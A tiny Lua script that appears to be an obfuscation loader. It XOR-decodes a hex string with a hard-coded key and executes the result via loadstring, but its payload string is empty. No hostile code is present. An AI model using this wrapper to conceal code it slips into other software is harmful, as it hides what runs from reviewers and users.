local k={13,219,255,238,180,150,9,82,55,237,65,231,36,44,15,28,187,170,100,46,40,160,13,239,207,9,152,95,192,240,27,239}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
